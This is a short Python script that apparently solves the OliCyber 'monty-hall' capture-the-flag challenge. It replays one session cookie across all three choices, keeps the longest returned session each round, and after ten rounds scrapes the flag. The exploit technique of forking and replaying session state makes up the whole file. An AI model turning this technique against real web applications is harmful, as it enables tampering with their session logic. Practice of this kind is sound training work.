import requests
from pwn import log
from urllib.parse import urlencode
from bs4 import BeautifulSoup as bs


url = "http://monty-hall.challs.olicyber.it/"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}


def main() -> None:
    cookie = requests.get(url).cookies
    log.info(f"New Cookie: {cookie["session"]}")

    for i in range(10):
        cookies = []
        
        for j in range(1,4):
            payload = urlencode({"choice": j})
            r = requests.post(url, headers=headers, cookies=cookie, data=payload)

            if "session" in r.cookies:
                cookies.append(r.cookies)
            
            else:
                # Flag found
                soup = bs(r.text, 'html.parser')
                res = soup.find('h1')
                
                if res is not None:
                    log.success(f"Flag: {res.text}")
                else:
                    log.warning("Flag not found :(")
                
                return
        
        cookie = cookies[0]
        
        for c in cookies:
            if len(c["session"]) > len(cookie["session"]):
                cookie = c
                
        log.success(f"{i+1} Cookie found: {cookie["session"]}")
            

if __name__ == "__main__":
    main()
